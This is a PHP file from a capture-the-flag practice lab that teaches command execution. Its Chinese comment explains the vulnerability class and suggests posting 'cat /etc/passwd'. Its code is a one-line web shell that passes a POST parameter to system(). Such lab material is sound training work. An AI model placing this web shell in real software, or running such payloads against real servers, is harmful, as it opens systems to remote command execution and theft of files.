<?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 关卡 3 :  命令执行 --- 

「命令执行(Command Execution)」 通常指的是在操作系统层面上执行预定义的指令或脚本。这些命令最终的指向通常是系统命令，如Windows中的CMD命令或Linux中的Shell命令，这在语言中可以体现为一些特定的函数或者方法调用，如PHP中的`shell_exec()`函数或Python中的`os.system()`函数。

当漏洞入口点只能执行系统命令时，我们可以称该漏洞为命令执行漏洞，如下面修改过的 "一句话木马":

try POST:
    a=cat /etc/passwd;

*/

system($_POST['a']);

highlight_file(__FILE__);


?>
